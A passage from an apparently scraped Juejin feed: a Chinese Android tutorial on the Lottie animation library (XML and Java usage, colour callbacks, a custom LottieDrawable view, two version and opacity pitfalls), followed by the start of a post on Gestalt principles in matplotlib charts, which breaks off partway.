<p>最近在做公司项目时候，有涉及到加载动画文件，看到以前的项目使用的是<a href="https://link.juejin.cn?target=https%3A%2F%2Flottie.airbnb.tech%2F%23%2F" target="_blank" title="https://lottie.airbnb.tech/#/" ref="nofollow noopener noreferrer">Lottie</a>这个库。</p>
<p>Lottie是一个很多平台都可以用的三方库，按照官网的原话简介如下，<strong>这里主要整理记录一下Android端的使用</strong>。</p>
<blockquote>
<p>Lottie 是一个适用于 Android、iOS、Web 和 Windows 的库，它解析 Adobe After Effects 导出的 JSON 格式动画（使用 Bodymovin），并在移动设备和网页上原生渲染它们！</p>
</blockquote>
<h3 data-id="heading-2">2.使用</h3>
<p>话不多说，直接开用。</p>
<p>lottie有指定运行的动画格式：就是json。</p>
<h4 data-id="heading-3"><strong>2.1导库：</strong></h4>
<p><strong>建议用最新版本，因为老版本踩过坑，后面解释</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">dependencies {
    ...
    implementation "com.airbnb.android:lottie:$lottieVersion"
    ...
}
</code></pre>
<h4 data-id="heading-4">2.2  LottieAnimationView</h4>
<p>LottieAnimationView是最简单、最直接的使用方式，继承自ImageView，可以在xml布局文件里面定义</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.airbnb.lottie.LottieAnimationView</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/animation_view"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
		
        <span class="hljs-attr">app:lottie_rawRes</span>=<span class="hljs-string">"@raw/hello_world"</span> //<span class="hljs-attr">R.raw</span>
        // <span class="hljs-attr">or</span>
        <span class="hljs-attr">app:lottie_fileName</span>=<span class="hljs-string">"hello_world.json"</span> //<span class="hljs-attr">assets</span>

        // <span class="hljs-attr">循环动画</span>
        <span class="hljs-attr">app:lottie_loop</span>=<span class="hljs-string">"true"</span>
        // <span class="hljs-attr">加载完成立马动画</span>
        <span class="hljs-attr">app:lottie_autoPlay</span>=<span class="hljs-string">"true"</span> /&gt;</span>
</code></pre>
<p>加载json动画文件的方式主要为以下两种：</p>
<ul>
<li>在resource目录下的raw目录（⭐）</li>
<li>在assets目录</li>
</ul>
<p>推荐第一种，可以通过<code>R</code>静态引用资源文件，非常利于管理和访问：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad8ec1281dd54cc0a4110fd1e68e0564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu95a625LqM57qn57yW56iL54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948790&amp;x-signature=Z7VaILmK%2BcmGfpzljU%2FDqhc9KqE%3D" alt="image-20260102150112885.png" loading="lazy"/></p>
<p><strong>代码层面设置也是ok的，这样更符合实际开发情况，动态加载动画</strong></p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView = findViewById(R.id.lottie);
lottieAnimationView.setAnimation(R.raw.confor);
lottieAnimationView.setRepeatCount(-<span class="hljs-number">1</span>);
lottieAnimationView.playAnimation();
</code></pre>
<p><strong>lottieview还可以设置静态资源，完全可以当成ImageView来用。</strong></p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.setImageResource(R.drawable.ic_launcher);
</code></pre>
<h5 data-id="heading-5">动画回调</h5>
<p>想要在动画运行前、后、取消时候进行处理，可以通过回调实现，这个看具体的开发逻辑</p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.addAnimatorListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Animator</span>.AnimatorListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationStart</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {
        lottieAnimationView.setSpeed(-<span class="hljs-number">1</span>);<span class="hljs-comment">//动画开始前设置到放</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationEnd</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationCancel</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationRepeat</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }
});
</code></pre>
<h5 data-id="heading-6">lottie属性改变</h5>
<p>如果想改变动画文件的填充颜色、不透明度、描边宽度等等内容，该怎么办呢，lottie提供了一个<code>addValueCallback</code>方法：</p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.addValueCallback(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyPath</span>(<span class="hljs-string">"**"</span>),
    LottieProperty.COLOR,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieValueCallback</span>&lt;Integer&gt;(){
        <span class="hljs-meta">@Nullable</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getValue</span><span class="hljs-params">(LottieFrameInfo frameInfo)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-number">0xffffff</span>;
        }
    }
);
</code></pre>
<p>上图中的例子，主要目的是改变动画文件的颜色，</p>
<ul>
<li>参数1，<code>keypath</code>是指定要改变的范围，<code>**</code>表示改变所有图层的颜色（这里涉及到分析json文件的格式，就不细讲了，可以参考<a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">这篇博文</a></li>
<li>参数2，传入要改变的属性，例如：<code>STROKE_COLOR</code>、<code>OPACITY</code>等等。具体可以点进这个类，查看支持哪些属性更改。</li>
<li>参数3，可以通过LottieFrameInfo具体到每一帧是否需要变化，如果不需要做任何处理，直接返回要修改的值即可，这里我对所有帧的颜色做更改。</li>
</ul>
<h4 data-id="heading-7">2.3  LottieDrawable</h4>
<p><strong>重头戏！！！！</strong></p>
<p>不知道大家有没有遇到一种情况：需要在自定义view里面实现lottie，这个时候需要在onDraw里面绘制LottieView</p>
<p>lottie官方也提供了可以用于任何view上的<code>LottieDrawable</code>，也是<code> LottieAnimationView</code>的底层实现</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLottieView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">View</span> {

    <span class="hljs-keyword">private</span> LottieDrawable lottieDrawable;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mHeight;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mWidth;
    <span class="hljs-keyword">private</span> KeyPath keyPath;
    <span class="hljs-keyword">private</span> LottieValueCallback&lt;Integer&gt; lottieValueCallback;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyLottieView</span><span class="hljs-params">(Context context, <span class="hljs-meta">@Nullable</span> AttributeSet attrs)</span> {
        <span class="hljs-built_in">super</span>(context, attrs);
        init();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        lottieDrawable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieDrawable</span>();
        <span class="hljs-comment">// 异步加载 Lottie JSON（推荐放 res/raw）</span>
        LottieCompositionFactory.fromRawRes(getContext(), R.raw.confor)
            .addListener(comp -&gt; {
                setupComposition(comp, lottieDrawable);
            })
            .addFailureListener(t -&gt; {
                Log.e(TAG, <span class="hljs-string">"Lottie load error"</span>, t);
            });

        keyPath = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyPath</span>(<span class="hljs-string">"**"</span>);
        lottieValueCallback = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieValueCallback</span>&lt;&gt;(<span class="hljs-number">0xbb191970</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupComposition</span><span class="hljs-params">(LottieComposition comp, LottieDrawable lottieDrawable)</span> {
        lottieDrawable.setCallback(<span class="hljs-built_in">this</span>);   <span class="hljs-comment">// 必须：允许 Lottie 触发 invalidate()</span>
        lottieDrawable.setComposition(comp);
        lottieDrawable.addAnimatorUpdateListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ValueAnimator</span>.AnimatorUpdateListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationUpdate</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ValueAnimator animation)</span> {
                invalidate();
            }
        });
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMeasure</span><span class="hljs-params">(<span class="hljs-type">int</span> widthMeasureSpec, <span class="hljs-type">int</span> heightMeasureSpec)</span> {
        <span class="hljs-built_in">super</span>.onMeasure(widthMeasureSpec, heightMeasureSpec);

        mHeight = getMeasuredHeight();
        mWidth = getMeasuredWidth();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDraw</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Canvas canvas)</span> {
        <span class="hljs-built_in">super</span>.onDraw(canvas);

        <span class="hljs-comment">// 设置绘制区域</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> getWidth();
		
        <span class="hljs-comment">//改变加载出来的动画颜色</span>
        drawable.addValueCallback(
            keyPath,
            LottieProperty.COLOR_FILTER,
            lottieValueCallback
        );

        drawable.setBounds(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">64</span>);<span class="hljs-comment">//指定绘制的大小</span>
        drawable.draw(canvas);

    }
}
</code></pre>
<p>在自定义view里绘制lottieView还是比较复杂的，上面就是一个简单的例子，可以根据需求，做进一步改动。</p>
<p>下面简单来解析一下上面代码的流程：</p>
<ul>
<li>首先是初始化一个<code>lottieDrawable</code>，它继承自<code>Drawable</code></li>
<li>然后是异步加载json动画文件，这一步lottie内部做了异步处理，解析得到的内容是无状态的动画模型——<code>LottieComposition</code>，我们需要在提供的回调内进行下一步处理</li>
<li>将解析得到的json文件加载到<code>lottieDrawable</code>里，并且为<code>lottieDrawable</code>绑定<code>drawable回调</code>，因为我们是支持animattion的drawable。并且设置<code>onAnimationUpdate</code>回调，当动画运行时对每一帧进行绘制</li>
<li>最后就是绘制drawable到屏幕上，绘制方法和原生drawable一样，大家肯定比较熟悉。</li>
</ul>
<h4 data-id="heading-8">！！坑</h4>
<h5 data-id="heading-9">坑一</h5>
<p>如果你的版本小于<code>6.0.0</code>，那么恭喜你，你可能在运行自己写的绘制代码后，lottie并未按照你设定的bounds显示，这是因为这前有bug导致<code>left</code>和<code>top</code>的设定是不生效的，在这个版本才被修复。所以最好用最新的版本，可以避免很多问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c185b422afa24978aff0435a7e19a17e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu95a625LqM57qn57yW56iL54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948790&amp;x-signature=ezrFoI%2FeTMfk3fEP%2FOCep9M2ORQ%3D" alt="image-20260102162406954.png" loading="lazy"/></p>
<h5 data-id="heading-10">坑二</h5>
<p>这个问题和json动画文件有关：</p>
<p><strong>原因：因为动画里包含很多图层，每一层都涉及不透明度和颜色，所以如果你修改整个文件的不透明度，那可能会出现动画的镂空部分被加上不透明度，也就是原本透明的地方出现颜色。</strong></p>
<p>这个问题的避免方式，只有在修改的时候自己确定好要修改哪些图层，这个就得了解你json文件的<a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">图层结构</a>了。（咱哪有这么多时间来了解这些破结构啊，写个代码还要学你AE导出动画的格式？）</p>
<blockquote>
<p>参考：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flottie.airbnb.tech%2F%23%2Fandroid" target="_blank" title="https://lottie.airbnb.tech/#/android" ref="nofollow noopener noreferrer">lottie.airbnb.tech/#/android</a></p>
<p><a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">juejin.cn/post/712163…</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[格式塔原理：数据可视化如何引导观众的注意力]]></title>    <link>https://juejin.cn/post/7590654280898805803</link>    <guid>https://juejin.cn/post/7590654280898805803</guid>    <pubDate>2026-01-02T07:02:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280898805803" data-draft-id="7589919989038710847" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="格式塔原理：数据可视化如何引导观众的注意力"/> <meta itemprop="keywords" content="Python,数据可视化,数据分析"/> <meta itemprop="datePublished" content="2026-01-02T07:02:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            格式塔原理：数据可视化如何引导观众的注意力
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:02:34.000Z" title="Fri Jan 02 2026 07:02:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据分析中，我们常说：“一张好的图表胜过千言万语。”</p>
<p>但很多时候，我们做出来的图表却是“千言万语堵在心口难开”。读者看了半天，抓不住重点。</p>
<p>这是为什么？</p>
<p>因为人类的视觉感知遵循一套被称为 <strong>格式塔（Gestalt）</strong> 的心理学原理。</p>
<p>简单来说，当我们看到一组物体时，大脑会自动将它们视为一个整体或一种模式，而不是孤立的碎片。</p>
<p>下面我们用 <code>Python</code> 的 <code>Matplotlib</code> 库，来演示 <strong>格式塔（Gestalt）</strong> 心理学中的 6 个核心原理，看看如何利用这些原理“控制”读者的注意力。</p>
<h2 data-id="heading-0">1. 邻近原理：距离产生“关系”</h2>
<p><strong>邻近原理</strong>就是距离越近，关系越亲，我们的大脑会自动把靠得近的物体归为一类。</p>
<p>就像在一个派对上，站在一起聊天的几个人，你会下意识觉得他们是一伙的。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 邻近原理</span>
<span class="hljs-comment"># 创建测试数据</span>
np.random.seed(<span class="hljs-number">42</span>)
data_a = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)
data_b = np.random.normal(<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)
data_c = np.random.normal(<span class="hljs-number">15</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">30</span>)

<span class="hljs-comment"># 不使用邻近原理</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 左侧：未应用邻近原理（所有点均匀分布）</span>
all_data = np.concatenate([data_a, data_b, data_c])
x_positions = np.arange(<span class="hljs-number">90</span>)
ax1.scatter(x_positions, all_data, alpha=<span class="hljs-number">0.7</span>)
ax1.grid(<span class="hljs-literal">True</span>, alpha=<span class="hljs-number">0.3</span>)

<span class="hljs-comment"># 右侧：应用邻近原理（按组聚集）</span>
<span class="hljs-keyword">for</span> i, (data, x_offset) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>([data_a, data_b, data_c], [<span class="hljs-number">0</span>, <span class="hljs-number">30</span>, <span class="hljs-number">60</span>])):
    x_positions = np.arange(<span class="hljs-built_in">len</span>(data)) + x_offset
    ax2.scatter(x_positions, data, alpha=<span class="hljs-number">0.7</span>, label=<span class="hljs-string">f'组<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>'</span>)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7994223b73b44bd69c19be71c0446590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=FAXc5HD3ZtjV4HIJcV2DMDqDEYo%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：将相关的数据点或元素放在靠近的位置，可以让观众自然地理解它们属于同一类别或具有某种关联。</p>
<h2 data-id="heading-1">2. 相似原理：相似的“性格”吸引</h2>
<p><strong>相似原理</strong>就是长得像的，就是一家人，当物体在颜色、形状或大小上相似时，大脑会将它们分为一组。</p>
<p>比如在足球场上，穿着相同颜色球衣的人，你不需要看清他们的脸，就知道他们是队友。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 相似原理</span>
<span class="hljs-comment"># 创建测试数据</span>
categories = [<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>]
values1 = [<span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">14</span>, <span class="hljs-number">18</span>, <span class="hljs-number">15</span>]
values2 = [<span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">10</span>]
x_pos = np.arange(<span class="hljs-built_in">len</span>(categories))

<span class="hljs-comment"># 相似原理示例</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 左侧：未应用相似原理（随机颜色和样式）</span>
bars1 = ax1.bar(x_pos - <span class="hljs-number">0.2</span>, values1, <span class="hljs-number">0.4</span>, color=colors1, edgecolor=<span class="hljs-string">"black"</span>)
bars2 = ax1.bar(
    x_pos + <span class="hljs-number">0.2</span>, values2, <span class="hljs-number">0.4</span>, color=colors2, edgecolor=<span class="hljs-string">"black"</span>, hatch=hatches[<span class="hljs-number">0</span>]
)

<span class="hljs-comment"># 为每组条形添加不同图案</span>
<span class="hljs-keyword">for</span> i, bar <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(bars2):
    bar.set_hatch(hatches[i % <span class="hljs-built_in">len</span>(hatches)])

<span class="hljs-comment"># 右侧：应用相似原理（一致的颜色和样式）</span>
ax2.bar(x_pos - <span class="hljs-number">0.2</span>, values1, <span class="hljs-number">0.4</span>, color=<span class="hljs-string">"skyblue"</span>, edgecolor=<span class="hljs-string">"black"</span>, label=<span class="hljs-string">"数据集1"</span>)
ax2.bar(
    x_pos + <span class="hljs-number">0.2</span>, values2, <span class="hljs-number">0.4</span>, color=<span class="hljs-string">"lightcoral"</span>, edgecolor=<span class="hljs-string">"black"</span>, label=<span class="hljs-string">"数据集2"</span>
)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0105a0f7fc74eeeae52baee13d0176c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=7fP2ieZ2i1YmhUOl0BYY7ELjV5o%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：使用一致的颜色、形状或样式来表示相同类型的数据，可以大大降低观众的认知负担。</p>
<h2 data-id="heading-2">3. 包围原理：边界创造"归属感"</h2>
<p>包围原理就是有围墙的地方就是家。如果在某些物体周围加上边界或背景色，它们就被视为一个独立的群体。</p>
<p>这个原理甚至比 <strong>“邻近”</strong> 和 <strong>“相似”</strong> 更强大。</p>
<p>比如，草地上散落着羊群，一旦你用栅栏圈住其中几只，大家就会认为这几只是被特别选中的。</p>
